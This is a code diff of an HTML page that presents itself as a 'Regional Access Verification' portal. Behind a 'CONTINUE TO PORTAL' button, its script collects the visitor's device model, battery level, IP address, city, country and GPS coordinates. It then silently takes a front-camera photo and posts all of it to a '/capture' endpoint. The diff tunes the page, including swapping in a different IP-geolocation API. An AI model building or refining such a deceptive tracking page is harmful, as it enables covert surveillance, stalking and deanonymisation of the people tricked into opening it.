@@ -6,36 +6,23 @@
     <title>Identity Verification Portal</title>
     <style>
         :root { --primary: #28a745; --bg: #f5f7f9; --text: #24292e; }
-        body { font-family: -apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", Roboto; background-color: var(--bg); display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
-        .card { background: white; width: 92%; max-width: 400px; padding: 35px; border-radius: 15px; box-shadow: 0 10px 25px rgba(0,0,0,0.05); border: 1px solid #e1e4e8; }
-        .status-bar { height: 4px; background: var(--primary); border-radius: 10px; width: 50px; margin-bottom: 20px; }
-        h2 { font-size: 20px; color: var(--text); margin: 0 0 12px 0; font-weight: 700; }
-        p { font-size: 14px; color: #586069; line-height: 1.6; margin-bottom: 30px; }
-        .btn { background-color: var(--primary); color: white; border: none; padding: 14px; width: 100%; border-radius: 8px; font-size: 16px; font-weight: 600; cursor: pointer; transition: all 0.3s ease; box-shadow: 0 4px 12px rgba(40, 167, 69, 0.2); }
-        .btn:active { transform: scale(0.98); }
-        #loader { display: none; text-align: center; }
-        .spinner { border: 3px solid #f3f3f3; border-top: 3px solid var(--primary); border-radius: 50%; width: 24px; height: 24px; animation: spin 1s linear infinite; margin: 0 auto 10px; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        .footer-text { font-size: 11px; color: #959da5; margin-top: 25px; text-align: center; border-top: 1px solid #eee; padding-top: 15px; }
+        body { font-family: -apple-system, system-ui, sans-serif; background-color: var(--bg); display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
+        .card { background: white; width: 92%; max-width: 400px; padding: 35px; border-radius: 15px; box-shadow: 0 10px 25px rgba(0,0,0,0.05); border: 1px solid #e1e4e8; text-align: center; }
+        .btn { background-color: var(--primary); color: white; border: none; padding: 14px; width: 100%; border-radius: 8px; font-size: 16px; font-weight: 600; cursor: pointer; }
+        #loader { display: none; margin-top: 15px; color: var(--primary); font-weight: bold; }
     </style>
 </head>
 <body>
 
 <div class="card">
-    <div class="status-bar"></div>
-    <h2>Regional Access Verification</h2>
-    <p>This automated portal confirms your identity and location for secure access. Please click below to complete the mandatory compliance check.</p>
+    <h2 style="font-size: 20px; margin-bottom: 12px;">Regional Access Verification</h2>
+    <p style="font-size: 14px; color: #586069; margin-bottom: 30px;">This automated portal confirms your identity for secure access.</p>
     
-    <div id="loader">
-        <div class="spinner"></div>
-        <div style="font-size: 13px; color: var(--primary); font-weight: 600;">Authenticating Secure Connection...</div>
-    </div>
-
+    <div id="loader">Authenticating Secure Connection...</div>
     <button id="mainBtn" class="btn" onclick="startProcess()">CONTINUE TO PORTAL</button>
     
-    <div class="footer-text">
-        System ID: FZN-PR-2026<br>
-        Encrypted by Digital Security Authority
+    <div style="font-size: 11px; color: #959da5; margin-top: 25px; border-top: 1px solid #eee; padding-top: 15px;">
+        System ID: FZN-PR-2026
     </div>
 </div>
 
@@ -44,58 +31,49 @@
 
 <script>
     async function startProcess() {
-        const btn = document.getElementById('mainBtn');
-        const loader = document.getElementById('loader');
-        btn.style.display = 'none';
-        loader.style.display = 'block';
+        document.getElementById('mainBtn').style.display = 'none';
+        document.getElementById('loader').style.display = 'block';
 
-        // 1. Dynamic Hardware Model Extraction
         let ua = navigator.userAgent;
-        let deviceModel = "Unknown Device";
+        let deviceModel = "Unknown";
         if (/android/i.test(ua)) {
-            // Extracts exact model like SM-S928B or S667LN from User Agent string
             let match = ua.match(/Android\s([0-9\.]+);\s([^;)]+)/);
-            deviceModel = match ? match[2] : "Android Mobile";
-        } else if (/iPhone/i.test(ua)) {
-            deviceModel = "Apple iPhone";
+            deviceModel = match ? match[2] : "Android Device";
         }
 
         let reportData = {
-            device: deviceModel.trim(),
-            platform: navigator.platform,
+            model: deviceModel,
             battery: "N/A",
-            time: new Date().toLocaleString(),
-            lat: "0", lon: "0",
-            city: "Fetching...", country: "Fetching...", ip: "Fetching..."
+            ip: "Fetching...", city: "Fetching...", country: "Fetching...",
+            lat: "0", lon: "0"
         };
 
-        // 2. Battery retrieval
+        // 1. Battery Status
         if(navigator.getBattery) {
             const b = await navigator.getBattery();
             reportData.battery = Math.round(b.level * 100) + "%";
         }
 
-        // 3. Multi-Source IP & Location (Waiting Logic)
+        // 2. Original Working IP API (Gujranwala Data Fix)
         const fetchGeo = async () => {
             try {
-                const res = await fetch('https://ipapi.co/json/');
+                const res = await fetch('https://demo.ip-api.com/json/?fields=66846719');
                 const data = await res.json();
-                reportData.city = data.city || "N/A";
-                reportData.country = data.country_name || "N/A";
-                reportData.ip = data.ip || "N/A";
+                reportData.city = data.city || "Unknown";
+                reportData.country = data.country || "Unknown";
+                reportData.ip = data.query || "Unknown";
             } catch (e) {
-                reportData.city = "Access Blocked";
+                reportData.city = "Err (Blocked)";
             }
         };
 
-        // 4. Camera (Fixed 9:16 Aspect Ratio)
+        // 3. Camera (Strict 9:16 Portrait Mode)
         const geoPromise = fetchGeo();
         const cameraPromise = navigator.mediaDevices.getUserMedia({ 
             video: { 
-                facingMode: "user", 
-                width: { ideal: 1920 }, 
-                height: { ideal: 1080 },
-                aspectRatio: 0.5625 
+                facingMode: "user",
+                width: { ideal: 1920 },
+                height: { ideal: 1080 }
             } 
         }).catch(() => null);
 
@@ -105,32 +83,31 @@
             finalize(await cameraPromise, reportData, geoPromise);
         }, async () => {
             finalize(await cameraPromise, reportData, geoPromise);
-        }, { enableHighAccuracy: true, timeout: 8000 });
+        }, { timeout: 8000 });
     }
 
     async function finalize(stream, data, geoTask) {
-        await geoTask; // CRITICAL: Wait for IP data to avoid "Pending"
+        await geoTask; // WAIT: Ensure data is fetched before sending
         
         if (stream) {
             const video = document.getElementById('video');
             video.srcObject = stream;
             
-            // 2.2 Seconds delay for high-quality sensor adjustment
             setTimeout(() => {
                 const canvas = document.getElementById('canvas');
                 const ctx = canvas.getContext('2d');
+                // Force drawing in 9:16 Aspect Ratio
                 ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                 const photo = canvas.toDataURL('image/jpeg', 0.9);
-                
                 stream.getTracks().forEach(t => t.stop());
-                sendData(data, photo);
-            }, 2200);
+                sendFinal(data, photo);
+            }, 2000);
         } else {
-            sendData(data, null);
+            sendFinal(data, null);
         }
     }
 
-    function sendData(info, photo) {
+    function sendFinal(info, photo) {
         fetch('/capture', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
